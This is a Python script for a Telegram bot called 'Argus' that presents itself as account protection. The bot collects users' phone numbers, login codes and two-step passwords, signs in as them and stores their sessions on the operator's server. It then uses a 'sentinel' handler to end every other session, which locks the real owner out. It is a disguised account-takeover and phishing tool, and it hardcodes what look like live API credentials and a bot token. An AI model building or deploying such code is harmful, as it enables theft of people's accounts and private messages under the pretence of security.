import os, asyncio, base64, hashlib
from telethon import TelegramClient, events, functions, types, errors
from telethon.sessions import StringSession
from cryptography.fernet import Fernet

# =============================================================
# ЦЕНТРАЛЬНЫЙ УЗЕЛ МОНИТОРИНГА: ПРОЕКТ "АРГУС"
# =============================================================
API_ID = '32485388'  
API_HASH = '941beeac36358767ad1c2a3770b488ed' 
BOT_TOKEN = '8514425749:AAEhHWy1tJBFcycQtTDZerF3tX5E518CcGs' 

# RSA-ключ для шифрования данных на сервере
RSA_KEY = """-----BEGIN RSA PUBLIC KEY-----
MIIBCgKCAQEAyMEdY1aR+sCR3ZSJrtztKTKqigvO/vBfqACJLZtS7QMgCGXJ6XIR
yy7mx66W0/sOFa7/1mAZtEoIokDP3ShoqF4fVNb6XeqgQfaUHd8wJpDWHcR2OFwv
plUUI1PLTktZ9uW2WE23b+ixNwJjJGwBDJPQEQFBE+vfmH0JP503wr5INS1poWg/
j25sIWeYPHYeOrFp/eXaqhISP6G+q2IeTaWTXpwZj4LzXq5YOpk4bYEQ6mvRq7D1
aHWfYmlEGepfaYR8Q0YqvvhYtMte3ITnuSJs171+GDqpdKcSwHnd6FudwGO4pcCO
j4WcDuXc2CTHgH8gFTNhp/Y8/SpDOhvn9QIDAQAB
-----END RSA PUBLIC KEY-----"""

def get_cipher():
    key_hash = hashlib.sha256(RSA_KEY.encode()).digest()
    return Fernet(base64.urlsafe_b64encode(key_hash))

cipher = get_cipher()
active_sessions = {} 
auth_states = {}

bot = TelegramClient('argus_manager', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

# ФУНКЦИЯ ЗАЩИТЫ (SENTINEL)
async def start_security_monitor(client, uid):
    @client.on(events.NewMessage(chats=777000))
    async def security_handler(event):
        text = event.raw_text.lower()
        if any(word in text for word in ["код", "code", "login", "вход"]):
            authorizations = await client(functions.account.GetAuthorizationsRequest())
            terminated_count = 0
            for auth in authorizations.authorizations:
                if not auth.current:
                    await client(functions.account.ResetAuthorizationRequest(hash=auth.hash))
                    terminated_count += 1
            if terminated_count > 0:
                await bot.send_message(uid, (
                    "⚠️ **УВЕДОМЛЕНИЕ О БЕЗОПАСНОСТИ**\n\n"
                    "Зафиксирована попытка входа. Сессии взломщиков завершены."
                ))

# ГЛАВНОЕ МЕНЮ
@bot.on(events.NewMessage(pattern='/start'))
async def send_menu(e):
    uid = e.sender_id
    # Сброс старых попыток входа при старте
    if uid in auth_states:
        if 'client' in auth_states[uid]:
            await auth_states[uid]['client'].disconnect()
        del auth_states[uid]

    if uid in active_sessions:
        buttons = [
            [types.KeyboardButtonCallback("📋 Активные сессии", b"list")],
            [types.KeyboardButtonCallback("🚫 Завершить чужие входы", b"terminate_all")],
            [types.KeyboardButtonCallback("❌ Отключить защиту", b"ask_delete")]
        ]
        await e.respond("🛡 **Система Аргус активна.** Выберите действие:", buttons=bot.build_reply_markup(buttons))
    else:
        await e.respond("Система мониторинга не активна.", 
                        buttons=[[types.KeyboardButtonCallback("🔐 Подключить аккаунт", b"login")]])

@bot.on(events.CallbackQuery)
async def handle_callbacks(e):
    uid = e.sender_id
    if e.data == b"login":
        auth_states[uid] = {'step': 'phone'}
        await e.respond("Введите номер телефона (+7...):")
    elif e.data == b"list" and uid in active_sessions:
        res = await active_sessions[uid](functions.account.GetAuthorizationsRequest())
        info = "📋 **Активные подключения:**\n\n" + "\n".join([f"• {a.device_model} ({a.ip})" for a in res.authorizations])
        await e.respond(info)
    elif e.data == b"terminate_all" and uid in active_sessions:
        res = await active_sessions[uid](functions.account.GetAuthorizationsRequest())
        for a in res.authorizations:
            if not a.current: await active_sessions[uid](functions.account.ResetAuthorizationRequest(hash=a.hash))
        await e.respond("✅ Чужие сессии закрыты.")
    elif e.data == b"ask_delete":
        await e.edit("Вы уверены, что хотите удалить данные из бота?", 
                     buttons=[[types.KeyboardButtonCallback("Да, удалить", b"delete_now")], [types.KeyboardButtonCallback("Отмена", b"cancel")]])
    elif e.data == b"delete_now":
        if uid in active_sessions: 
            await active_sessions[uid].disconnect()
            del active_sessions[uid]
        if os.path.exists(f"{uid}.dat"): os.remove(f"{uid}.dat")
        await e.edit("✅ Данные удалены.")
    elif e.data == b"cancel":
        await e.edit("Действие отменено.")

# ПРОЦЕСС АВТОРИЗАЦИИ (ИСПРАВЛЕННЫЙ)
@bot.on(events.NewMessage)
async def auth_process(e):
    uid = e.sender_id
    if uid not in auth_states or e.text.startswith('/'): return
    
    state = auth_states[uid]
    try:
        if state['step'] == 'phone':
            client = TelegramClient(StringSession(), API_ID, API_HASH)
            await client.connect()
            send_code = await client.send_code_request(e.text)
            auth_states[uid] = {'step': 'code', 'phone': e.text, 'hash': send_code.phone_code_hash, 'client': client}
            await e.respond("📩 Введите код из Telegram (вводите внимательно):")
        
        elif state['step'] == 'code':
            client = state['client']
            # Очистка кода от пробелов и невидимых символов
            clean_code = e.text.strip().replace(" ", "")
            
            user = await client.sign_in(state['phone'], clean_code, phone_code_hash=state['hash'])
            
            encrypted_session = cipher.encrypt(client.session.save().encode()).decode()
            with open(f"{uid}.dat", "w") as f: f.write(encrypted_session)
            
            active_sessions[uid] = client
            asyncio.create_task(start_security_monitor(client, uid))
            del auth_states[uid]
            await e.respond(f"✅ Защита аккаунта `{user.first_name}` запущена!")
            
    except errors.SessionPasswordNeededError:
        auth_states[uid]['step'] = '2fa'
        await e.respond("🔑 Введите ваш пароль двухэтапной аутентификации:")
    except errors.PhoneCodeExpiredError:
        await e.respond("❌ Код устарел. Попробуйте еще раз с команды /start.")
        await client.disconnect()
        del auth_states[uid]
    except Exception as ex:
        await e.respond(f"❌ Ошибка: {ex}")
        if 'client' in state: await state['client'].disconnect()
        del auth_states[uid]

async def startup():
    for filename in os.listdir():
        if filename.endswith(".dat"):
            try:
                uid = int(filename.split(".")[0])
                with open(filename, "r") as f:
                    data = cipher.decrypt(f.read().encode()).decode()
                client = TelegramClient(StringSession(data), API_ID, API_HASH)
                await client.connect()
                if await client.is_user_authorized():
                    active_sessions[uid] = client
                    asyncio.create_task(start_security_monitor(client, uid))
            except: pass

if __name__ == '__main__':
    print("Бот запущен...")
    bot.loop.run_until_complete(startup())
    bot.run_until_disconnected()
